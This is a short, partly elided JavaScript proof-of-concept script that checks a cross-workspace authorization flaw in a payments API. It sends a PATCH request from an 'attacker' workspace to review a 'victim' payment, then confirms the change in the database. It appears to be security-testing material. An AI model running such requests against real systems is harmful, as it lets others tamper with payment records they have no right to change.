...
async function run() {
  ...
  const response = await fetch(
    `${baseUrl}/api/workspaces/${attackerWorkspace.id}/payments/${victimPayment.id}/review`,
    {
      method: "PATCH",
      headers: {
  ...
  if (response.status === 200) {
    console.log(
      "✅ VULNERABILITY CONFIRMED: Payment review successful across workspace boundaries!",
    );
    console.log("Response:", JSON.stringify(result, null, 2));

    // Verify in DB
    const updatedPayment = await prisma.payment.findUnique({
      where: { id: victimPayment.id },
    });
